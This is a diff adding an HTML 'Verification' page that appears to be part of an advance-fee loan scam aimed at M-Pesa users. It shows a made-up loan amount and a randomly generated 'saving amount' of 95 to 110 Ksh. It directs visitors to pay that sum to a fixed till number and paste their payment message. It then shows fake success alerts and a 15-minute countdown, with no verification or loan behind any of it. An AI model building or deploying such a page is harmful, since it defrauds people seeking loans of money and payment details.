@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verification</title>
+  <link rel="stylesheet" href="veri.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0;
+    }
+    h1 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+    /* Combined container styling */
+    .account-info {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 2px 2px 12px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .account-info p {
+      font-size: 1.2em;
+      margin: 10px 0;
+    }
+    .savings-message textarea {
+      width: 100%;
+      height: 80px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      resize: none;
+      font-size: 1em;
+    }
+    .account-image {
+      width: 100%;
+      max-width: 150px;
+      display: block;
+      margin: 10px auto;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    /* Optional: If you prefer using a list element instead */
+.account-details ol {
+  text-align: center;
+  padding-left: 20px;
+  margin: 10px 0;
+}
+
+.account-details ol li {
+  margin-bottom: 8px;
+  font-size: 1.0em;
+  line-height: 1.0;
+}
+    .thank-you {
+      font-size: 1.0em;
+      font-weight: bold;
+      color: rgb(10, 10, 10);
+      text-align: center;
+      background-position-x: center;
+    }
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 2em;
+      font-weight: bold;
+      display: none;
+    }
+    button {
+      padding: 12px 24px;
+      background-color: #007BFF;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1em;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    #gifcontent {
+      display: none;
+      width: 150px;
+      margin: 10px auto;
+    }
+  </style>
+</head>
+<body>
+  <h1>Verification</h1>
+  
+  <!-- Combined Account Information -->
+  <div class="account-info">
+    <p id="loanDisplay">Target Loan Amount: </p>
+    <p id="savingDisplay">Saving Amount: </p>
+    <h2>Account Details</h2>
+    <p id="firstName">Account Name: Loading...</p>
+    <p id="phoneNumber">Phone Number: Loading...</p>
+    <p class="thank-you">CLICK ON THE TILL NUMBER BELOW TO COPY TILL TO CLIPBOARD</p>
+    <ol id="text">
+      <li>Go to Mpesa</li>
+      <li>Lipa na Mpesa</li>
+      <li>Buy Goods and Services</li>
+      <li>Enter 9824375</li>
+    </ol>
+  </div>
+  
+  <!-- Clickable account image -->
+  <img src="LIPA NA MPESA INUKA.jpeg" alt="Account Details" class="account-image" id="accountImage">
+
+  <div class="savings-message">
+    <textarea id="savingsText" placeholder="Paste your Mpesa savings message here..."></textarea>
+  </div>
+
+  <button id="submitButton">Submit</button>
+  <img src="process.gif" alt="Authorization GIF" id="gifcontent">
+
+  <div class="overlay" id="overlay">
+    Processing...: <span id="timer">15:00</span>
+  </div>
+
+  <script>
+    // Get stored data from localStorage
+    const targetValue = localStorage.getItem('targetValue');
+    let savingAmount = localStorage.getItem('savingAmount');
+    const firstName = localStorage.getItem('firstname') || "Unknown";
+    const phoneNumber = localStorage.getItem('phone') || "Not Available";
+
+    if (!savingAmount) {
+      savingAmount = Math.floor(Math.random() * (110 - 95 + 1)) + 95;
+      localStorage.setItem('savingAmount', savingAmount);
+    }
+
+    function formatNumber(num) {
+      return parseInt(num).toLocaleString();
+    }
+
+    document.getElementById('loanDisplay').textContent = targetValue 
+      ? 'Target Loan Amount: Ksh ' + formatNumber(targetValue)
+      : 'Target Loan Amount: Not Available';
+    document.getElementById('savingDisplay').textContent = 'Saving Amount: Ksh ' + formatNumber(savingAmount);
+
+    // Display user details
+    document.getElementById('firstName').textContent = "Account Name: " + firstName;
+    document.getElementById('phoneNumber').textContent = "Phone Number: " + phoneNumber;
+
+    // Copy account number (9824375) when account image is clicked
+    document.getElementById('accountImage').addEventListener('click', function() {
+      const accountNumber = "9824375";
+      navigator.clipboard.writeText(accountNumber).then(() => {
+        alert("Account number " + accountNumber + " copied to clipboard.");
+      }).catch((err) => {
+        alert("Failed to copy account number.");
+      });
+    });
+
+    function startTimer(duration, display) {
+      let timer = duration, minutes, seconds;
+      let interval = setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        display.textContent = minutes + ":" + seconds;
+        if (--timer < 0) {
+          clearInterval(interval);
+          document.getElementById('overlay').style.display = "none";
+          alert("HAKIKA R PROVISION\nYour savings verification is complete.");
+        }
+      }, 1000);
+    }
+
+    document.getElementById('submitButton').addEventListener('click', function() {
+      const message = document.getElementById("savingsText").value;
+      if (message.trim() === "") {
+        alert("Please paste your Mpesa savings message before submitting.");
+        return;
+      }
+      document.getElementById('gifcontent').style.display = "block";
+      setTimeout(() => {
+        document.getElementById('gifcontent').style.display = "none";
+        alert("HAKIKA R PROVISION\nYour transaction has been received successfully.\nProcessing time: 15 minutes.");
+        document.getElementById('overlay').style.display = "flex";
+        startTimer(900, document.getElementById('timer'));
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
